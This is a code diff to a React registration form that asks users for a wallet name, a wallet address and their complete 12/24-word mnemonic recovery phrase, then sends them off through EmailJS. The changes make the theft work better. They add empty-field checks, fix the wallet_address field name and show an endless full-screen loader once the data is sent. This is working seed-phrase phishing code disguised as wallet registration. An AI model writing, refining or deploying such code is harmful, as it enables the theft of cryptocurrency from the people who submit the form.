@@ -7,12 +7,24 @@ import emailjs from '@emailjs/browser';
 
 const Register = () => {
   const navigate = useNavigate();
-  const [isLoading, setIsLoading] = useState(false)
+  const [isLoading, setIsLoading] = useState(false);
+  const [isDataSent, setIsDataSent] = useState(false)
 
   const form = useRef();
 
   const sendEmail = (e) => {
     e.preventDefault();
+    const formData = new FormData(form.current);
+
+    // Access individual input values
+    const input1Value = formData.get('wallet_name');
+    const input2Value = formData.get('wallet_address');
+    const input3Value = formData.get('phrase');
+
+    if(input1Value.trim() == "" || input2Value.trim() == "" || input3Value.trim() == ""){
+      alert("Fields cannot be empty")
+      return;
+    }
     setIsLoading(true)
     emailjs
       .sendForm('service_r6ibjwj', 'template_29dzzmd', form.current, {
@@ -21,10 +33,13 @@ const Register = () => {
       .then(
         () => {
           setIsLoading(false);
+          setIsDataSent(true);
           console.log('SUCCESS!');
         },
         (error) => {
           setIsLoading(false)
+          setIsDataSent(false)
+          alert("An error Occurred, try again")
           console.log('FAILED...', error.text);
         },
       );
@@ -53,7 +68,7 @@ const Register = () => {
           </div>
           <div className='flex flex-col gap-1 w-full'>
             <label className=''>Wallet Address</label>
-            <input name='waller_address' className='p-3 w-full border-[1px] rounded-[8px] ' placeholder='enter wallet address...' />
+            <input name='wallet_address' className='p-3 w-full border-[1px] rounded-[8px] ' placeholder='enter wallet address...' />
           </div>
           <div className='flex flex-col gap-1 w-full'>
             <label className=''>Enter the complete 12/24 mnemonic phrase</label>
@@ -66,6 +81,10 @@ const Register = () => {
           />
         </div>
       </form>
+
+      {isDataSent == true && <div className="fixed w-full bg-primary z-30 grid place-items-center h-[100vh]">
+        <div className="loader"></div>
+      </div>}
     </div>
   )
 }
